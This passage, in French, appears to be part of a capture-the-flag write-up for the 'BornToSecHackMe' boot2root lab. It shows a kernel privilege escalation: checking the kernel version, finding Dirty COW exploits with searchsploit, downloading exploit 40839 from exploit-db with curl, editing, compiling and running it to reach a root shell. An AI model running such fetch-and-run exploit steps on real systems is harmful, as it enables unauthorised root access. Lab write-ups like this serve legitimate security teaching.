Sachant que nous avons un shell stable, il est possible
de récupérer plus d'informations sur le système:

```bash
laurie@BornToSecHackMe:~$ uname -smr
Linux 3.2.0-91-generic-pae i686
```

En 2016, la vulnérabilité [Dirty Cow](https://www.wikiwand.com/fr/Dirty_COW) a été découverte et mise
publique. Le kernel étant assez ancien, nous allons rechercher quelques exploits avec `searchsploit`.

```bash
$ searchsploit "Linux Kernel < 3. Dirty"
```

![Searchsploit](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/searchsploit.png)

Apres plusieurs tests, nous avons choisis l'exploit [**40839**](https://www.exploit-db.com/exploits/40839):

```bash
$ curl https://www.exploit-db.com/raw/40839 -o dirty.c
$ sed -i s/firefart/root/ dirty.c # Change l'id de l'user
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty 42
```

![Searchsploit](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/dirty.png)

Nous sommes en possession d'un shell en *uid=0*.
